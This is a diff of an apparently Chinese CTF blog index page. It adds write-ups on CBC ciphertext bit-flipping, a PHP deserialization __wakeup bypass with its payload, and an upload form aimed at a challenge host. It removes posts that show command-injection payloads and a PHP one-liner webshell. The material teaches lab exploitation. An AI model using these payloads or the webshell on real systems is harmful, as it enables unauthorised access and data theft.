@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 16.67px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 18.33px;">脚本编写</a>
+						<a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,278 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-对cipher进行翻转" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%E5%AF%B9cipher%E8%BF%9B%E8%A1%8C%E7%BF%BB%E8%BD%AC/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%E5%AF%B9cipher%E8%BF%9B%E8%A1%8C%E7%BF%BB%E8%BD%AC/">
+        对cipher进行翻转
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CBC中对cipher进行翻转"><a href="#CBC中对cipher进行翻转" class="headerlink" title="CBC中对cipher进行翻转"></a>CBC中对cipher进行翻转</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iv_raw=&#x27;NdSNDmRE9krO3GFhtgtpCQ%3D%3D&#x27;</span><br><span class="line">print(&quot;原来的iv_raw：&quot;+iv_raw)</span><br><span class="line"></span><br><span class="line">cipher_raw=&#x27;ZtbLOd8aevMJOTnaG6irEdkhmf3qfqBigqioL1vsDugWkwYJ%2FHUZrkF56V6zza4ZdzNex8EOb1u%2Bc%2FPPakb0VA%3D%3D&#x27;</span><br><span class="line"></span><br><span class="line">print(&quot;原来的cipher：&quot;+cipher_raw)</span><br><span class="line"></span><br><span class="line">cipher=base64.b64decode(urllib.unquote(cipher_raw)) #对cipher_raw用urllib.unqote进行url解码，然后用base64.b54decode()对url解码出来的东西进行base64字节流解码</span><br><span class="line"></span><br><span class="line">#a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;&#125;</span><br><span class="line">#s:2:&#123;s:8:&quot;userna</span><br><span class="line">#me&quot;;s:5:&quot;zdmin&quot;;</span><br><span class="line">#s:8:&quot;password&quot;;s</span><br><span class="line">#:3:&quot;12345&quot;;&#125;</span><br><span class="line"></span><br><span class="line">xor_cipher=cipher[0:9]+chr(ord(cipher[9])^ord(&#x27;z&#x27;)^ord(&#x27;a&#x27;))+cipher[10:] #取出cipher（即原序列化）中我们要更改的字符，然后用异或的方式进行更改</span><br><span class="line"></span><br><span class="line">print(&quot;翻转后的cipher：&quot;)</span><br><span class="line">print(urllib.quote(base64.b64encode(xor_cipher)))</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-极客大挑战 2019PHP" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019PHP/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019PHP/">
+        极客大挑战 2019PHP
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="极客大挑战-2019php"><a href="#极客大挑战-2019php" class="headerlink" title="极客大挑战 2019php"></a>极客大挑战 2019php</h1><p>观察页面，发现页面有写有备份网站的文件，然后就用dirsearch和御剑扫描域名的目录</p>
+<p>发现后缀文件名为index.php和<a target="_blank" rel="noopener" href="http://www.zip时,状态码为200/">www.zip时，状态码为200</a></p>
+<p>因此，在域名后加<a target="_blank" rel="noopener" href="http://www.zip的目录信息/">www.zip的目录信息</a></p>
+<p><a target="_blank" rel="noopener" href="http://d94bb716-8ba6-4774-b46f-abb523abfa71.node3.buuoj.cn/www.zip">http://d94bb716-8ba6-4774-b46f-abb523abfa71.node3.buuoj.cn/www.zip</a></p>
+<p>可以下载压缩包</p>
+<p>打开压缩包后发现几个文件，然后逐个打开，发现class.php里的php代码</p>
+<p>审计代码</p>
+<?php
+include 'flag.php';
+
+
+error_reporting(0);
+
+
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){ #创建的时候被调用
+        $this->username = $username;
+        $this->password = $password;
+    }
+
+    function __wakeup(){
+        $this->username = 'guest';  #将guest赋值给$username
+    }
+
+    function __destruct(){  #销毁时调用
+        if ($this->password != 100) {  #判断password是否等于100
+            echo "</br>NO!!!hacker!!!</br>";
+            echo "You name is: ";
+            echo $this->username;echo "</br>";
+            echo "You password is: ";
+            echo $this->password;echo "</br>";
+            die();
+        }
+        if ($this->username === 'admin') { #判断username是否是admin
+            global $flag;  #对外部$flag同名引用
+            echo $flag;
+        }else{
+            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
+            die();
+
+            
+        }
+    }
+}
+?>
+
+<p>通过代码审计可知只要username=admin且password=100，则可以显示出flag，但是因为有__wakeup()这个函数，所以输入的username会变成guest<br>而__wakeup()函数，如果表示属性个数的值大于真实属性个数的值，那么就会绕过__wakeup()函数。又因为成员变量使用的是private这个声明私有字段<br>所以需要将成员变量的值放在new Name()的括号中，且序列化时，类名和字段名的前面都会加上\0的前缀</p>
+<p>构造exp得到序列化后的数值</p>
+<?php
+
+class Name{
+    private $username;
+    private $password;
+
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+
+    function __wakeup(){
+        $this->username = 'guest';
+    }
+
+    function __destruct(){
+        if ($this->password != 100) {
+            echo "</br>NO!!!hacker!!!</br>";
+            echo "You name is: ";
+            echo $this->username;echo "</br>";
+            echo "You password is: ";
+            echo $this->password;echo "</br>";
+            die();
+        }
+        if ($this->username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
+            die();
+
+            
+        }
+    }
+}
+$a=new Name('admin',100);
+echo serialize($a);
+?>
+
+
+<p>得到的结果是</p>
+<p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p>
+<p>需要在类名和字段名前面加上\0的前缀，同时改变属性的数值，将2改为3</p>
+<p>O:4:”Name”:3:{s:14:”\0Name\0username”;s:5:”admin”;s:14:”\0Name\0password”;i:100;}</p>
+<p>然后构造payload</p>
+<p>index.php?select=O:4:”Name”:3:{s:14:”\0Name\0username”;s:5:”admin”;s:14:”\0Name\0password”;i:100;}</p>
+<p>便可得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-文件上传html" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0html/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0html/">
+        文件上传html
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;form action=&quot;http://270d00af-27b8-4527-a8bd-786af2f51c5e.node3.buuoj.cn/?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-极客大挑战 2019]BuyFlag" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -714,284 +986,9 @@
 
 
   
-    <article id="post-Exec(命令执行)" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/16/Exec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/" class="article-date">
-  	<time datetime="2021-07-15T16:00:00.000Z" itemprop="datePublished">2021-07-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/16/Exec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/">
-        Exec
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h3 id="“-”分号的使用"><a href="#“-”分号的使用" class="headerlink" title="“;”分号的使用"></a>“;”分号的使用</h3><p>方式：command1;command2</p>
-<p>用分号隔开每条命令，并且从左到右的顺序执行命令，彼此之间相互独立，互不干涉。</p>
-<h3 id="“-”管道符使用"><a href="#“-”管道符使用" class="headerlink" title="“|”管道符使用"></a>“|”管道符使用</h3><p>上一条命令的输出，作为下一条命令的输入，在ctf中：ping 127.0.0.1 | ls (只会执行ls不会执行ping命令）</p>
-<p>方式：command1 | command2</p>
-<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>利用一个管道</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmp -qa | grep licq //将rmp -qa输出的结果通过管道输送给grep命令</span><br></pre></td></tr></table></figure>
-<p>rmp -qa是输出系统中所有安装的RPM包，grep licp是查找有licp字符的RPM包<br>grep命令是查找文件里满足条件的字符串</p>
-<p>利用多条管道</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /ect/passwd | grep /bin/bash | wc -l //将第一个管道的输出（passwd的内容）通过管道输送给第二个管道，将第二管道的输出（passwd内容里有/bin/bash的所有行）通过管道输送给第三个管道，第三个管道通过wc命令统计出输入的行数，并输出</span><br></pre></td></tr></table></figure>
-<p>wc命令是统计出输入的行数</p>
-<h3 id="“-amp-”符号的用法，在ctf中：ping-127-0-0-1-amp-ls（先输出ls，再执行ping命令）"><a href="#“-amp-”符号的用法，在ctf中：ping-127-0-0-1-amp-ls（先输出ls，再执行ping命令）" class="headerlink" title="“&amp;”符号的用法，在ctf中：ping 127.0.0.1 &amp; ls（先输出ls，再执行ping命令）"></a>“&amp;”符号的用法，在ctf中：ping 127.0.0.1 &amp; ls（先输出ls，再执行ping命令）</h3><p>方式：command 1&amp;</p>
-<p>默认情况下，进程是前台进程，这样会占用shell，无法执行其它进程，所以有些没有的进程都希望可以放在后台，所以此时我们在后台的参数后面加上“&amp;”实现这个目的</p>
-<h3 id="“-amp-amp-”符号和“-”符号"><a href="#“-amp-amp-”符号和“-”符号" class="headerlink" title="“&amp;&amp;”符号和“||”符号"></a>“&amp;&amp;”符号和“||”符号</h3><p>“&amp;&amp;”和“||”符号满足短路原则。“&amp;&amp;”符号，如果左边为假，则不执行右边，反之，执行右边。而“||”符号，如果左边为真，则不执行右边，反之，执行右边</p>
-<p>“&amp;&amp;”格式：command 1 &amp;&amp; command 2<br>“||”格式：command 1 || command 2</p>
-<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>判断主机存活</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 || result=1</span><br></pre></td></tr></table></figure>
-<p>重定向：&gt;和&gt;&gt;是输出重定向，&gt;是覆盖文件中的原有文件，文件存在，则删除文件并新建文件，并输入数据内容；&gt;&gt;是在原有文件里的内容后面添加，没有文件则创建文件，并添加内容<br>             &lt;是输入重定向<br>             &amp;&gt;是命令的标准正确输出或标准错误输出直接输出到你重定向的文件中</p>
-<h3 id="linux下的find命令"><a href="#linux下的find命令" class="headerlink" title="linux下的find命令"></a>linux下的find命令</h3><p>.表示当前用户下的目录，/表示系统的根目录</p>
-<p>find / -name filename //查找系统目录下的filename文件</p>
-<p>find命令的详细讲解：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yorkyang/p/6294894.html">https://www.cnblogs.com/yorkyang/p/6294894.html</a></p>
-<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>先构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls;</span><br></pre></td></tr></table></figure>
-<p>可以看到index.php文件</p>
-<p>然后构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat /index.php</span><br></pre></td></tr></table></figure>
-<p>发现一串php代码，通过审计代码发现没有任何过滤</p>
-<p>因此构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | find / -name flag</span><br></pre></td></tr></table></figure>
-
-<p>可以看到flag在/flag里</p>
-<p>所以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat /flag</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-[ciscn uploads]代码审计和文件上传" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/16/%5Bciscn%20uploads%5D%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
-  	<time datetime="2021-07-15T16:00:00.000Z" itemprop="datePublished">2021-07-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/16/%5Bciscn%20uploads%5D%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-        上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小"><a href="#上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小" class="headerlink" title="上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小"></a>上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小</h1><h2 id="上传表单的制作"><a href="#上传表单的制作" class="headerlink" title="上传表单的制作"></a>上传表单的制作</h2><p>可以通过html来编写上传的表单，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;form action=&quot;http://270d00af-27b8-4527-a8bd-786af2f51c5e.node3.buuoj.cn/?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>同时$_FILE[ ][ ]中的两个括号中填的信息的含义</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$_FILES数组内容如下:</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;userfile&quot;&gt;</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;]</span><br><span class="line">客户端机器文件的原名称。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] </span><br><span class="line">文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;size&#x27;] </span><br><span class="line">已上传文件的大小，单位为字节。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] </span><br><span class="line">文件被上传后在服务端储存的临时文件名。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;error&#x27;] </span><br><span class="line">和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。</span><br><span class="line">注: 在 PHP 4.1.0 版本以前该数组的名称为 $HTTP_POST_FILES，它并不像 $_FILES 一样是自动全局变量。PHP 3 不支持 $HTTP_POST_FILES 数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="图片马的制作"><a href="#图片马的制作" class="headerlink" title="图片马的制作"></a>图片马的制作</h2><p>可以通过png-IDAT-Payload-Generator制作图片马，这个工具可以在github中找到，直接运行其中的generate.py软件就可以制作了。但是直接运行代码制作的代码的木马是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>要执行这一个木马，需要get提交0=system，然后再post提交1=ls+/etc就可以访问系统的配置文件</p>
-<p>然后我们可以通过CyberChef来对上面中的generate.py文件中的payload部分进行修改，从而制作自己喜欢的一句话木马的图片马<br>![ciscn upload1](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ciscn">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ciscn</a> upload1.jpg)</p>
-<p>具体可以看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangdie666/article/details/116997461">https://blog.csdn.net/jiangdie666/article/details/116997461</a></p>
-<h2 id="特殊字符的绕过"><a href="#特殊字符的绕过" class="headerlink" title="特殊字符的绕过"></a>特殊字符的绕过</h2><p>如果代码中出现mb_strtolower()这一个php函数的话，它的作用是让字符串变为小写，则可以使用unicode中的一些相似的字符对要过滤的字符进行一个绕过，其中的例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符i可以使用unicode中的İ进行绕过，其中可以将İ变为url形式为%c4%b0</span><br></pre></td></tr></table></figure>
-
-<h2 id="修改文件的大小"><a href="#修改文件的大小" class="headerlink" title="修改文件的大小"></a>修改文件的大小</h2><p>文件可以通过加</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 想要的宽度大小</span><br><span class="line">#define height 想要的高度大小</span><br></pre></td></tr></table></figure>
-<p>来伪造文件的大小，而如果是图片，则将它们放在头部，而如果是zip文件，则可以通过抓包的形式放在文件的尾部</p>
-<h2 id="ciscn-upload的实例"><a href="#ciscn-upload的实例" class="headerlink" title="ciscn upload的实例"></a>ciscn upload的实例</h2><p>打开网址，可以看见一串代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (!isset($_GET[&quot;ctf&quot;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&quot;ctf&quot;]))</span><br><span class="line">    $ctf = $_GET[&quot;ctf&quot;];</span><br><span class="line"></span><br><span class="line">if($ctf==&quot;poc&quot;) &#123;</span><br><span class="line">    $zip = new \ZipArchive();</span><br><span class="line">    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];</span><br><span class="line">    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;</span><br><span class="line">        die(&quot;要不咱们再看看？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;</span><br><span class="line">        die (&quot;都不能解压呢&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &quot;可以解压，我想想存哪里&quot;;</span><br><span class="line">    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    